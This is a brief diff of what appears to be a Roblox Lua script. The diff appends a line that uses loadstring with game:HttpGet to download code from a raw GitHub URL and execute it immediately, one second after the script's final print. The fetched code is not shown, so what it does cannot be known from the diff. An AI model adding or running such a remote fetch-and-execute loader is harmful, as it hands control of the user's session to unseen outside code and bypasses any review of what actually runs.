@@ -2963,3 +2963,6 @@ task.spawn(function()
 end)
 
 print("UWUV67")
+
+task.wait(1)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/67Studio/A/refs/heads/main/AGENTE", true))()
